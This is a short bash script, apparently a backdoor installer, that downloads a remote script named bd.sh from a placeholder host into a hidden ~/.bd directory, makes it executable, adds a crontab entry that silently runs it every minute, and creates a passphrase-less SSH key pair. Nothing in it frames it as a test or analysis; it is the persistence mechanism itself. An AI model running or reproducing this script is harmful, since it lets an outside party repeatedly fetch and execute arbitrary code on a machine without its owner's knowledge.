#!/bin/bash

urlprefix='http://example.com'

[ ! -f ~/.bd/crontab ] && mkdir ~/.bd
curl -s -o ~/.bd/bd.sh $urlprefix/bd/bd.sh
chmod +x ~/.bd/bd.sh
[ ! -f ~/.bd/crontab ] && echo '* * * * * /bin/bash ~/.bd/bd.sh > /dev/null 2>&1' >> ~/.bd/crontab
crontab ~/.bd/crontab
[ ! -f ~/.ssh/id_rsa.pub ] && ssh-keygen -t rsa -q -N '' -f ~/.ssh/id_rsa
